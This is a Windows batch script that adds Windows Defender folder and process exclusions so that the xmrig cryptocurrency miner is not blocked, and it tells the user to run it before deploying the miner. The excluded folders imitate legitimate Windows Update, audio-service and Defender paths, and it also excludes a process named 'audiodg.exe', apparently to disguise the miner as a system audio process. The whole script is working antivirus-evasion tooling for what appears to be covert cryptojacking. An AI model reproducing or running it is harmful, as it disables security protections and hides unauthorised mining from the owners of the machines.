@echo off
title ADD WINDOWS DEFENDER EXCLUSIONS
color 0E

echo ================================================================
echo  ADD WINDOWS DEFENDER EXCLUSIONS
echo  Run this BEFORE deploying the miner
echo ================================================================
echo.
echo This will add exclusions so Defender won't block the miner.
echo.
pause

echo.
echo Adding exclusions...
echo.

REM Add folder exclusions
powershell -Command "Add-MpPreference -ExclusionPath 'C:\ProgramData\Microsoft\Windows\WindowsUpdate' -Force"
powershell -Command "Add-MpPreference -ExclusionPath 'C:\Windows\System32\WindowsPowerShell\v1.0\Modules\AudioSrv' -Force"
powershell -Command "Add-MpPreference -ExclusionPath 'C:\ProgramData\Microsoft\Network\Downloader' -Force"
powershell -Command "Add-MpPreference -ExclusionPath '%LOCALAPPDATA%\Microsoft\Windows\PowerShell' -Force"
powershell -Command "Add-MpPreference -ExclusionPath '%LOCALAPPDATA%\Microsoft\Windows\Defender' -Force"
powershell -Command "Add-MpPreference -ExclusionPath '%APPDATA%\Microsoft\Windows\Templates' -Force"
powershell -Command "Add-MpPreference -ExclusionPath '%TEMP%\WindowsUpdateCache' -Force"
powershell -Command "Add-MpPreference -ExclusionPath '%CD%' -Force"

echo.
echo Adding process exclusions...
echo.

REM Add process exclusions
powershell -Command "Add-MpPreference -ExclusionProcess 'xmrig.exe' -Force"
powershell -Command "Add-MpPreference -ExclusionProcess 'audiodg.exe' -Force"

echo.
echo ================================================================
echo  EXCLUSIONS ADDED SUCCESSFULLY!
echo ================================================================
echo.
echo Now you can run START_ULTIMATE_FIXED.bat safely.
echo Windows Defender will not block the miner.
echo.
pause
